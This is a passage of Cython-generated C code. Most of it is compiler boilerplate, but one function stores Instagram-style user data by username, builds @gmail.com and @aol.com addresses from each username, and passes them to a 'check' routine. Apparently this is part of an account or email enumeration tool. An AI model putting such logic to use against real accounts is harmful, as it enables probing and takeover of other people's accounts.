            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_10 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_4)) {
          PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_n_u_data, __pyx_t_1};
          __pyx_t_7 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 676, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
          PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_n_u_data, __pyx_t_1};
          __pyx_t_7 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 676, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        } else
        #endif
        {
          __pyx_t_11 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 676, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_11);
          if (__pyx_t_2) {
            __Pyx_GIVEREF(__pyx_t_2); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_2); __pyx_t_2 = NULL;
          }
          __Pyx_INCREF(__pyx_n_u_data);
          __Pyx_GIVEREF(__pyx_n_u_data);
          PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_10, __pyx_n_u_data);
          __Pyx_GIVEREF(__pyx_t_1);
          PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_10, __pyx_t_1);
          __pyx_t_1 = 0;
          __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_11, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 676, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 677, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 677, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_11 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_10 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_4)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_n_u_user, __pyx_t_7};
          __pyx_t_5 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 677, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_n_u_user, __pyx_t_7};
          __pyx_t_5 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 677, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        } else
        #endif
        {
          __pyx_t_1 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 677, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_1);
          if (__pyx_t_11) {
            __Pyx_GIVEREF(__pyx_t_11); PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_11); __pyx_t_11 = NULL;
          }
          __Pyx_INCREF(__pyx_n_u_user);
          __Pyx_GIVEREF(__pyx_n_u_user);
          PyTuple_SET_ITEM(__pyx_t_1, 0+__pyx_t_10, __pyx_n_u_user);
          __Pyx_GIVEREF(__pyx_t_7);
          PyTuple_SET_ITEM(__pyx_t_1, 1+__pyx_t_10, __pyx_t_7);
          __pyx_t_7 = 0;
          __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_1, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 677, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_infoinsta); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 676, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (unlikely(PyObject_SetItem(__pyx_t_4, __pyx_v_username, __pyx_t_5) < 0)) __PYX_ERR(0, 676, __pyx_L5_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        __pyx_t_5 = PyNumber_Add(__pyx_v_username, __pyx_kp_u_gmail_com); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 678, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = PyNumber_Add(__pyx_v_username, __pyx_kp_u_aol_com); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 678, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_1 = PyList_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 678, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GIVEREF(__pyx_t_5);
        PyList_SET_ITEM(__pyx_t_1, 0, __pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_4);
        PyList_SET_ITEM(__pyx_t_1, 1, __pyx_t_4);
        __pyx_t_5 = 0;
        __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_emails, ((PyObject*)__pyx_t_1));
        __pyx_t_1 = 0;

        
        __pyx_t_1 = __pyx_v_emails; __Pyx_INCREF(__pyx_t_1); __pyx_t_15 = 0;
        for (;;) {
          if (__pyx_t_15 >= PyList_GET_SIZE(__pyx_t_1)) break;
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          __pyx_t_4 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_15); __Pyx_INCREF(__pyx_t_4); __pyx_t_15++; if (unlikely(0 < 0)) __PYX_ERR(0, 679, __pyx_L5_error)
          #else
          __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_15); __pyx_t_15++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 679, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_4);
          #endif
          __Pyx_XDECREF_SET(__pyx_v_email, __pyx_t_4);
          __pyx_t_4 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_check); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 680, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_7 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
            if (likely(__pyx_t_7)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
              __Pyx_INCREF(__pyx_t_7);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_5, function);
            }
          }
          __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_email);
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 680, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          
        }
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
      }
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
      goto __pyx_L12_try_end;
      __pyx_L5_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

      
      __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
      if (__pyx_t_10) {
        __Pyx_ErrRestore(0,0,0);
        goto __pyx_L6_exception_handled;
      }
      goto __pyx_L7_except_error;
      __pyx_L7_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_12);
      __Pyx_XGIVEREF(__pyx_t_13);
      __Pyx_XGIVEREF(__pyx_t_14);
      __Pyx_ExceptionReset(__pyx_t_12, __pyx_t_13, __pyx_t_14);
      goto __pyx_L1_error;
      __pyx_L6_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_12);
      __Pyx_XGIVEREF(__pyx_t_13);
      __Pyx_XGIVEREF(__pyx_t_14);
      __Pyx_ExceptionReset(__pyx_t_12, __pyx_t_13, __pyx_t_14);
      __pyx_L12_try_end:;
    }
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_AddTraceback("source.gg", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XDECREF(__pyx_v_emails);
  __Pyx_XDECREF(__pyx_v_email);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static struct __pyx_obj_6source___pyx_scope_struct__genexpr *__pyx_freelist_6source___pyx_scope_struct__genexpr[8];
static int __pyx_freecount_6source___pyx_scope_struct__genexpr = 0;

static PyObject *__pyx_tp_new_6source___pyx_scope_struct__genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_6source___pyx_scope_struct__genexpr > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct__genexpr)))) {
    o = (PyObject*)__pyx_freelist_6source___pyx_scope_struct__genexpr[--__pyx_freecount_6source___pyx_scope_struct__genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_6source___pyx_scope_struct__genexpr));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_6source___pyx_scope_struct__genexpr(PyObject *o) {
  struct __pyx_obj_6source___pyx_scope_struct__genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct__genexpr *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_v_i);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_6source___pyx_scope_struct__genexpr < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct__genexpr)))) {
    __pyx_freelist_6source___pyx_scope_struct__genexpr[__pyx_freecount_6source___pyx_scope_struct__genexpr++] = ((struct __pyx_obj_6source___pyx_scope_struct__genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_6source___pyx_scope_struct__genexpr(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_6source___pyx_scope_struct__genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct__genexpr *)o;
  if (p->__pyx_v_i) {
    e = (*v)(p->__pyx_v_i, a); if (e) return e;
  }
  return 0;
}

static PyTypeObject __pyx_type_6source___pyx_scope_struct__genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "source.__pyx_scope_struct__genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_6source___pyx_scope_struct__genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_6source___pyx_scope_struct__genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC, /*tp_flags*/
  0, /*tp_doc*/
  __pyx_tp_traverse_6source___pyx_scope_struct__genexpr, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  0, /*tp_dictoffset*/
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_6source___pyx_scope_struct__genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  0, /*tp_finalize*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0, /*tp_print*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
  0, /*tp_pypy_flags*/
  #endif
};

static struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *__pyx_freelist_6source___pyx_scope_struct_1_genexpr[8];
static int __pyx_freecount_6source___pyx_scope_struct_1_genexpr = 0;

static PyObject *__pyx_tp_new_6source___pyx_scope_struct_1_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_6source___pyx_scope_struct_1_genexpr > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct_1_genexpr)))) {
    o = (PyObject*)__pyx_freelist_6source___pyx_scope_struct_1_genexpr[--__pyx_freecount_6source___pyx_scope_struct_1_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_6source___pyx_scope_struct_1_genexpr));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_6source___pyx_scope_struct_1_genexpr(PyObject *o) {
  struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_v_i);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_6source___pyx_scope_struct_1_genexpr < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct_1_genexpr)))) {
    __pyx_freelist_6source___pyx_scope_struct_1_genexpr[__pyx_freecount_6source___pyx_scope_struct_1_genexpr++] = ((struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_6source___pyx_scope_struct_1_genexpr(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)o;
  if (p->__pyx_v_i) {
    e = (*v)(p->__pyx_v_i, a); if (e) return e;
  }
  return 0;
}

static PyTypeObject __pyx_type_6source___pyx_scope_struct_1_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "source.__pyx_scope_struct_1_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_6source___pyx_scope_struct_1_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_6source___pyx_scope_struct_1_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC, /*tp_flags*/
  0, /*tp_doc*/
  __pyx_tp_traverse_6source___pyx_scope_struct_1_genexpr, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  0, /*tp_dictoffset*/
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_6source___pyx_scope_struct_1_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  0, /*tp_finalize*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0, /*tp_print*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
  0, /*tp_pypy_flags*/
  #endif
};

static struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *__pyx_freelist_6source___pyx_scope_struct_2_genexpr[8];
static int __pyx_freecount_6source___pyx_scope_struct_2_genexpr = 0;

static PyObject *__pyx_tp_new_6source___pyx_scope_struct_2_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_6source___pyx_scope_struct_2_genexpr > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct_2_genexpr)))) {
    o = (PyObject*)__pyx_freelist_6source___pyx_scope_struct_2_genexpr[--__pyx_freecount_6source___pyx_scope_struct_2_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_6source___pyx_scope_struct_2_genexpr));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_6source___pyx_scope_struct_2_genexpr(PyObject *o) {
  struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_v_i);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_6source___pyx_scope_struct_2_genexpr < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct_2_genexpr)))) {
    __pyx_freelist_6source___pyx_scope_struct_2_genexpr[__pyx_freecount_6source___pyx_scope_struct_2_genexpr++] = ((struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_6source___pyx_scope_struct_2_genexpr(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)o;
  if (p->__pyx_v_i) {
    e = (*v)(p->__pyx_v_i, a); if (e) return e;
  }
  return 0;
}

static PyTypeObject __pyx_type_6source___pyx_scope_struct_2_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "source.__pyx_scope_struct_2_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_6source___pyx_scope_struct_2_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_6source___pyx_scope_struct_2_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC, /*tp_flags*/
  0, /*tp_doc*/
  __pyx_tp_traverse_6source___pyx_scope_struct_2_genexpr, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  0, /*tp_dictoffset*/
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_6source___pyx_scope_struct_2_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  0, /*tp_finalize*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0, /*tp_print*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
  0, /*tp_pypy_flags*/
  #endif
};

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

static int __pyx_import_star_set(PyObject *o, PyObject* py_name, char *name) {
  static const char* internal_type_names[] = {
    "__pyx_ctuple_double",
    "__pyx_ctuple_double_struct",
    "__pyx_ctuple_long",
    "__pyx_ctuple_long__and_long",
    "__pyx_ctuple_long__and_long_struct",
    "__pyx_ctuple_long_struct",
    "__pyx_scope_struct_1_genexpr",
    "__pyx_scope_struct_2_genexpr",
    "__pyx_scope_struct__genexpr",
    0
  };
  const char** type_name = internal_type_names;
  while (*type_name) {
    if (__Pyx_StrEq(name, *type_name)) {
      PyErr_Format(PyExc_TypeError, "Cannot overwrite C type %s", name);
      goto bad;
    }
    type_name++;
  }
  if (0);
  else {
    if (PyObject_SetAttr(__pyx_m, py_name, o) < 0) goto bad;
  }
  return 0;
  bad:
  return -1;
}

static int
__Pyx_import_all_from(PyObject *locals, PyObject *v)
{
    PyObject *all = PyObject_GetAttrString(v, "__all__");
    PyObject *dict, *name, *value;
    int skip_leading_underscores = 0;
    int pos, err;
    if (all == NULL) {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError))
            return -1;
        PyErr_Clear();
        dict = PyObject_GetAttrString(v, "__dict__");
        if (dict == NULL) {
            if (!PyErr_ExceptionMatches(PyExc_AttributeError))
                return -1;
            PyErr_SetString(PyExc_ImportError,
            "from-import-* object has no __dict__ and no __all__");
            return -1;
        }
#if PY_MAJOR_VERSION < 3
        all = PyObject_CallMethod(dict, (char *)"keys", NULL);
#else
        all = PyMapping_Keys(dict);
#endif
        Py_DECREF(dict);
        if (all == NULL)
            return -1;
        skip_leading_underscores = 1;
    }
    for (pos = 0, err = 0; ; pos++) {
        name = PySequence_GetItem(all, pos);
        if (name == NULL) {
            if (!PyErr_ExceptionMatches(PyExc_IndexError))
                err = -1;
            else
                PyErr_Clear();
            break;
        }
        if (skip_leading_underscores &&
#if PY_MAJOR_VERSION < 3
            likely(PyString_Check(name)) &&
            PyString_AS_STRING(name)[0] == '_')
#else
            likely(PyUnicode_Check(name)) &&
            likely(__Pyx_PyUnicode_GET_LENGTH(name)) &&
            __Pyx_PyUnicode_READ_CHAR(name, 0) == '_')
#endif
        {
            Py_DECREF(name);
            continue;
        }
        value = PyObject_GetAttr(v, name);
        if (value == NULL)
            err = -1;
        else if (PyDict_CheckExact(locals))
            err = PyDict_SetItem(locals, name, value);
        else
            err = PyObject_SetItem(locals, name, value);
        Py_DECREF(name);
        Py_XDECREF(value);
        if (err != 0)
            break;
    }
    Py_DECREF(all);
    return err;
}
static int __pyx_import_star(PyObject* m) {
    int i;
    int ret = -1;
    char* s;
    PyObject *locals = 0;
    PyObject *list = 0;
#if PY_MAJOR_VERSION >= 3
    PyObject *utf8_name = 0;
#endif
    PyObject *name;
    PyObject *item;
    locals = PyDict_New();              if (!locals) goto bad;
    if (__Pyx_import_all_from(locals, m) < 0) goto bad;
